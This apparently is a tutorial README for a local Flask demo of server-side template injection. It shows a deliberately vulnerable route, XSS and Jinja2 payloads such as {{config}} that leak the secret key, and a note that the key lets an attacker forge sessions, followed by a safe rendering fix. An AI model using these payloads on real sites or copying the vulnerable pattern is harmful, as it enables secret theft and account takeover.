# SSTI-fLask-session-forge  

This a simple demo to show how to forge a fake session by SSTI(server side template injection) in Flask.

## Running app firstly

```bash
python3 ssti_demo.py
```

Then access `127.0.0.1:8999`, we can see a login form

## Normal Login  

Because we set unknown password of user, it is impossible to bruteforce to hack

```py
if username=="admin" and password!=str(uuid.uuid4()):
    return "login failed"
```

## Template injection  

We found a page `/content` and it also receives a argument content `/content?content=good`. This page will return everything what content is

```py
@app.route("/content", methods=['GET'])
def content():
    content = request.args.get("content")
    return render_template_string(content)
```  

- **If we try some XSS:** 

`/content?content=<script>alert(1)</script>`
`alert(1) in window`

XSS successfully runs in this way. 

- **Let us see another vulnerbility:**

`/content?content={{2*2}}`
`4`

Expression is excuted in double bracket and return its value

- **Danger operations is to get config file:**

`/content?content={{config}}`
`<Config {'ENV': 'production', 'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Hello World!', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>`

we got the secret key `'SECRET_KEY': 'Hello World!'`, so we can decode the JWT token and forge fake token or session to get the authentication.  


## Remediate Our Code
Template injection occurs if render_template_string rendering is used incorrectly. So we will try a new way.
```py
//index.py
@app.route("/content", methods=['GET'])
def content():
    content = request.args.get("content")
    return render_template_string("{{html}}", html=content)
```

`/content?content=<script>alert(1)</script>`
`<script>alert(1)</script>`

In this case, the JavaScript code is output as it is, because template engines generally default to encoding and escaping the rendered variable values, so there will be no xss or eval like dangerous operations.

## Conclusion  

The main problem is that in the process of web application template rendering, the most popular rendering engine templates are smarty, twig, jinja2, freemarker, velocity, etc.

Flask uses jinja2 as a rendering template, so when rendering a template, variables should be transferd into plain string so that it can ensure a safe rendering.

## Reference  
https://github.com/noraj/flask-session-cookie-manager
https://blog.csdn.net/qq_39850969/article/details/86581393